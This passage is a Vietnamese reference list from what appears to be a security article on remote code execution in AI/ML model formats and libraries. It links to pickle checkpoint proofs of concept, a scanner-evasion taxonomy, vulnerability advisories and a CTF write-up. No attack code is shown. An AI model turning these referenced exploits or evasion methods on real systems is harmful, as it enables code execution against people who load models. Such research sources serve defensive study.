- [9] [PoC checkpoint độc hại (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Trình nạp sau bản vá (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Thực thi mã từ xa với các định dạng và thư viện AI/ML hiện đại](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Tài liệu Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit block-list của Hydra (cảnh báo về RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Từ SQLi đến RCE: Khai thác checkpointer của LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Chuyển hướng các lỗi Archive Slip thành các chương trình săn tiền thưởng AI/ML giá trị cao](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Thông báo bảo mật của Snyk và PoC PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Mã nguồn MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – các endpoint tải artifact xuống và tải lên](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Phân loại các kỹ thuật né tránh trình quét tĩnh MLTracer của Binarly](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – Phát hiện model độc hại bằng MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Triển khai `_load_from_bytes` của PyTorch storage](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Ánh xạ tương thích `find_class` của CPython pickle](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Ánh xạ import `_compat_pickle` của CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
